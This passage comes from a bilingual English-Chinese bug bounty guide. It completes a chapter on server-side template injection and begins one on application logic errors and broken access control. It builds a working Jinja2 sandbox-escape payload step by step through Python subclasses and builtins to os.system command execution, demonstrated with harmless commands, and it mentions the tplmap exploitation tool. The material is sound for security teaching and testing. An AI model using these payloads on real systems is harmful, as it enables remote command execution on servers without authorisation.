     __class__
    attribute, which refers to the class the instance belongs to,
     list
    :
    首先创建一个空列表，并调用其 __class__ 属性，该属性指向实例所属的类，即列表类：
[].__class__
    Then you can use the
     __bases__
    attribute to refer to the base classes of the
     list
    class:
    你可以使用 __bases__ 属性来引用列表类的基类:
[].__class__.__bases__
    This attribute will return a tuple (which is just an ordered list in Python) of all the base classes of the class
     list
    . A
     base class
    is a class that the current class is built from;
     list
    has a base class called
     object
    . Next, we need to access the
     object
    class by referring to the first item in the tuple:
    这个属性将返回一个元组（在Python中只是一个有序列表），其中包含所有类列表的基类。基类是当前类构建的类；列表有一个名为object的基类。接下来，我们需要通过引用元组中的第一个项来访问object类：
[].__class__.__bases__[0]
    Finally, we use
     __subclasses__()
    to refer to all the subclasses of the class:
    最后，我们使用__subclasses__()来引用类的所有子类：
[].__class__.__bases__[0].__subclasses__()
    When we use this method, all the subclasses of the
     object
    class become accessible to us! Now, we simply need to look for a method in one of these classes that we can use for command execution. Let’s explore one possible way of executing code. Before we go on, keep in mind that not every application’s Python environment will have the same classes. Moreover, the payload I’ll talk about next may not work on all target applications.
    当我们使用这种方法时，所有对象类的子类都可以被我们访问！现在，我们只需要在这些类中寻找一个能用于命令执行的方法。让我们探索一种可能的执行代码的方式。在继续之前，请记住，不是每个应用程序的Python环境都具有相同的类。此外，我接下来要谈论的有效负载可能无法在所有目标应用程序上运行。
    The
     __import__
    function, which can be used to import modules, is one of Python’s built-in functions. But since Jinja2 is blocking its direct access, you will need to access it via the
     builtins
    module. This module provides direct access to all of Python’s built-in classes and functions. Most Python modules have
     __builtins__
    as an attribute that refers to the built-in module, so you can recover the
     builtins
    module by referring to the
     __builtins__
    attribute.
    __import__函数是Python内置函数之一，可用于导入模块。但由于Jinja2阻止其直接访问，因此您需要通过builtins模块访问它。该模块提供了对Python所有内置类和函数的直接访问。大多数Python模块都有__builtins__属性，该属性指向内置模块，因此您可以通过引用__builtins__属性来恢复builtins模块。
    Within all the subclasses in
     [].__class__.__bases__[0].__subclasses__()
    , there is a class named
     catch_warnings
    . This is the subclass we’ll use to construct our exploit. To find the
     catch_warnings
    subclass, inject a loop into the template code to look for it:
    在[].__class__.__bases__[0].__subclasses__()的所有子类中，有一个名为catch_warnings的类。 这是我们用来构造攻击的子类。 要找到catch_warnings子类，请将循环注入模板代码以寻找它：
1 {% for x in [].__class__.__bases__[0].__subclasses__() %}
2 {% if 'catch_warnings' in x.__name__ %}
3 {{x()}}
{%endif%}
{%endfor%}
    This loop goes through all the classes in
     [].__class__.__bases__[0].__subclasses__()
     1
    and finds the one with the string
     catch_warnings
    in its name
     2
    . Then it instantiates an object of that class
     3
    . Objects of the class
     catch_warnings
    have an attribute called
     _module
    that refers to the
     warnings
    module.
    此循环遍历[]中的所有类。__class__.__bases__[0].__subclasses__()并查找名称中包含字符串catch_warnings的类。然后实例化该类的对象。 catch_warnings类的对象具有称为_module的属性，该属性引用warnings模块。
    Finally, we use the reference to the module to refer to the
     builtins
    module:
    最终，我们使用对模块的引用来引用内置模块：
{% for x in [].__class__.__bases__[0].__subclasses__() %}
{% if 'catch_warnings' in x.__name__ %}
{{x()._module.__builtins__}}
{%endif%}
{%endfor%}
    You should see a list of built-in classes and functions returned, including the function
     __import__
    :
    你应该看到返回的内置类和函数列表，其中包括函数__import__：
{'__name__': 'builtins', '__doc__': "Built-in functions, exceptions, and other objects.\n\nNoteworthy: None is the 'nil' object; Ellipsis represents '...' in slices.", '__package__': '', '__loader__': , '__spec__': ModuleSpec(name='builtins', loader=), '__build_class__': , '__import__': , 'abs': , 'all': , 'any': , 'ascii': , 'bin': , 'breakpoint': , 'callable': , 'chr': , 'compile': , 'delattr': , 'dir': , 'divmod': , 'eval': , 'exec': , 'format': , 'getattr': , 'globals': , 'hasattr': , 'hash': , 'hex': , 'id': , 'input': , 'isinstance': , 'issubclass': , 'iter': , 'len': , 'locals': , 'max': , 'min': , 'next': , 'oct': , 'ord': , 'pow': , 'print': , 'repr': , 'round': , 'setattr': , 'sorted': , 'sum': , 'vars': , 'None': None, 'Ellipsis': Ellipsis, 'NotImplemented': NotImplemented, 'False': False, 'True': True, 'bool': , 'memoryview': , 'bytearray': , 'bytes': , 'classmethod': , ...}
    We now have a way to access the import functionality! Since the built-in classes and functions are stored in a Python dictionary, you can access the
     __import__
    function by referring to the key of the function’s entry in the dictionary:
    我们现在有一种访问导入功能的方法！由于内置类和函数存储在Python字典中，您可以通过引用函数条目在字典中的键来访问__import__函数：
{% for x in [].__class__.__bases__[0].__subclasses__() %}
{% if 'catch_warnings' in x.__name__ %}
{{x()._module.__builtins__['__import__']}}
{%endif%}
{%endfor%}
    Now we can use the
     __import__
    function to import the
     os
    module. You can import a module with
     __import__
    by providing the name of that module as an argument. Here, let’s import the
     os
    module so we can access the
     system()
    function:
    现在我们可以使用__import__函数来导入os模块。您可以通过将该模块的名称作为参数来使用__import__导入模块。在这里，让我们导入os模块，以便我们可以访问system()函数：
{% for x in [].__class__.__bases__[0].__subclasses__() %}
{% if 'catch_warnings' in x.__name__ %}
{{x()._module.__builtins__['__import__']('os')}}
{%endif%}
{%endfor%}
    Finally, call the
     system()
    function and put the command we want to execute as the
     system()
    function’s argument:
    最后，调用system()函数并将我们想要执行的命令作为system()函数的参数。
{% for x in [].__class__.__bases__[0].__subclasses__() %}
{% if 'catch_warnings' in x.__name__ %}
{{x()._module.__builtins__['__import__']('os').system('ls')}}
{%endif%}
{%endfor%}
    You should see the results of the
     ls
    command returned. This
    command lists the contents of the current directory. You’ve achieved command execution! Now, you should be able to execute arbitrary system commands with this template injection.
    你应该看到ls命令返回的结果。此命令列出当前目录的内容。你已经成功执行了命令！现在，你应该能够使用此模板注入执行任意系统命令。
    Submitting Payloads for Testing
    For testing purposes, you should execute code that doesn’t harm the system you’re targeting. A common way of proving that you’ve achieved command execution and gained access to the operating system is to create a file with a distinct filename on the system, such as
     template_injection_by_YOUR_BUG_BOUNTY_USERNAME.txt
    , so that the file is clearly a part of your proof of concept. Use the
     touch
    command to create a file with the specified name in the current directory:
    为了测试目的，您应该执行不会损害目标系统的代码。证明您已经成功执行命令并获得了对操作系统的访问权限的一种常见方法是在系统上创建一个具有独特文件名的文件，例如template_injection_by_YOUR_BUG_BOUNTY_USERNAME.txt，以便文件明显是您概念证明的一部分。使用touch命令在当前目录中创建具有指定名称的文件：
{% for x in [].__class__.__bases__[0].__subclasses__() %}
{% if 'warning' in x.__name__ %}
{{x()._module.__builtins__['__import__']('os').system('touch template_injection_by_vickie.txt')}}
{%endif%}
{%endfor%}
    Different template engines require different escalation techniques. If exploring this interests you, I encourage you to do more research into the area. Code execution and sandbox escapes are truly fascinating topics. We will discuss more about how to execute arbitrary code on target systems in Chapter 18. If you are interested in learning more about sandbox escapes, these articles discuss the topic in more detail (this chapter’s example was developed from a tip in Programmer Help):
    不同的模板引擎需要不同的升级技术。如果您对此感兴趣，我鼓励您进一步研究这个领域。代码执行和沙箱逃逸是非常迷人的主题。我们将在第18章更多地讨论如何在目标系统上执行任意代码。如果您想了解更多有关沙箱逃逸的信息，这些文章会更详细地讨论该主题（本章的示例来自程序员帮助的提示）。
     CTF Wiki, https://ctf-wiki.github.io/ctf-wiki/pwn/linux/sandbox/python-sandbox-escape/
     HackTricks,
      https://book.hacktricks.xyz/misc/basic-python/bypass-python-sandboxes/
     Programmer Help,
      https://programmer.help/blogs/python-sandbox-escape.html
    Automating Template Injection
    Developing exploits for each system you target can be time-consuming. Luckily, templates often contain already known exploits that others have discovered, so when you find a template injection vulnerability, it’s a good idea to automate the exploitation process to make your work more efficient.
    为每一个你针对的系统开发漏洞利用可能非常耗费时间。幸运的是，模板通常包含其他人发现的已知漏洞，因此当您发现一个模板注入漏洞时，自动化利用过程是个不错的选择，可以让您的工作更有效率。
    One tool built to automate the template injection process, called tplmap (
     https://github.com/epinna/tplmap/
    ), can scan for template injections, determine the template engine in use, and construct exploits. While this tool does not support every template engine, it should provide you with a good starting point for the most popular ones.
    一个用于自动化模板注入过程的工具叫做tplmap（https://github.com/epinna/tplmap/），它可以扫描模板注入，确定使用的模板引擎，并构建攻击。虽然这个工具不支持每个模板引擎，但它应该为大多数流行的模板引擎提供一个很好的起点。
    Finding Your First Template Injection!
    It’s time to find your first template injection vulnerability by following the steps we discussed in this chapter:
    是时候按照本章节讨论的步骤，找到你的第一个模板注入漏洞了。
     Identify any opportunity to submit user input to the application. Mark down candidates of template injection for further inspection.
     Detect template injection by submitting test payloads. You can use either payloads that are designed to induce errors, or engine-specific payloads designed to be evaluated by the template engine.
     If you find an endpoint that is vulnerable to template injection, determine the template engine in use. This will help you build an exploit specific to the template engine.
     Research the template engine and programming language that the target is using to construct an exploit.
     Try to escalate the vulnerability to arbitrary command execution.
     Create a proof of concept that does not harm the targeted system. A good way to do this is to execute
      touch template_injection_by_
      YOUR_NAME
      .txt
     to create a specific proof-of-concept file.
     Draft your first template injection report and send it to the organization!
17
      Application Logic Errors and Broken Access Control
    Application logic errors and broken access control vulnerabilities are quite different from those we’ve discussed so far. Most of the vulnerabilities covered in previous chapters are caused by faulty input validation: they happen when polluted user input is processed without proper sanitization. These malicious inputs are syntactically different from normal user input and are designed to manipulate application logic and cause damage to the application or its users.
    应用程序逻辑错误和破坏访问控制漏洞与我们到目前为止所讨论的那些漏洞非常不同。前几章涵盖的大多数漏洞都是由于输入验证错误造成的：它们发生在未经适当清理的污染用户输入被处理时。这些恶意输入与正常用户输入在语法上有所不同，旨在操纵应用程序逻辑并对应用程序或其用户造成损害。
    On the other hand, application logic errors and broken access control issues are often triggered by perfectly valid HTTP requests containing no illegal or malformed character sequences. Still, these requests are crafted intentionally to misuse the application’s logic for malicious purposes or circumvent the application’s access control.
    另一方面，应用程序逻辑错误和破损的访问控制问题通常由完全有效的HTTP请求触发，不包含任何非法或格式错误的字符序列。然而，这些请求是有意制作出来的，以恶意目的滥用应用程序的逻辑或规避应用程序的访问控制。
    Application logic errors are logic flaws in an application. Sometimes attackers can exploit them to cause harm to the organization, the application, or its users. Broken access control occurs when sensitive resources or functionality are not properly protected. To find these vulnerabilities, you cannot simply rely on your technical knowledge. Instead, you need to use your creativity and intuition to bypass restrictions set by the developers. This chapter explains these vulnerabilities, how they manifest in applications, and how you can test for them.
    应用程序逻辑错误是应用程序中的逻辑缺陷。有时攻击者可以利用它们来对组织、应用程序或其用户造成伤害。破损的访问控制是指没有正确保护敏感资源或功能。要发现这些漏洞，您不能仅仅依赖您的技术知识。相反，您需要使用您的创造力和直觉来绕过开发人员设置的限制。本章介绍这些漏洞在应用程序中的表现，以及您如何测试它们。
    Application Logic Errors
     Application logic errors
    , or
     business logic vulnerabilities
    , are ways of using the legitimate logic flow of an application that result in a negative consequence to the organization. Sound a bit abstract? The best way to understand them is to look at a few examples.
    应用程序逻辑错误或业务逻辑漏洞是利用应用程序的合法逻辑流程导致组织出现负面后果的方式。听起来有点抽象？了解它们的最好方法是看一些示例。
    A common application logic error I’ve seen in the websites I’ve targeted is a flaw in the site’s multifactor authentication functionality.
     Multifactor authentication
    , or
     MFA
    , is the practice of requiring users to prove their identities in more than one way. MFA protects users in the event of password compromise by requiring them to authenticate with both a password and another proof of identity—typically a phone number or an email account, but sometimes via an authentication app, a physical key, or even fingerprints. Most MFA implementations prompt the user to authenticate using both a password and an authorization code delivered via email or text message.
    我在攻击的网站中经常遇到的常见应用逻辑错误是网站的多因素认证功能的漏洞。 多因素认证（MFA）是一种要求用户以多种方式证明其身份的做法。 MFA通过要求用户使用密码和另一种身份证明方式（通常是电话号码或电子邮件帐户，但有时也会通过认证应用程序，物理钥匙甚至指纹）进行身份验证，保护用户在密码泄露事件中的安全。 大多数MFA实施会提示用户使用密码和通过电子邮件或短信提供的授权代码进行身份验证。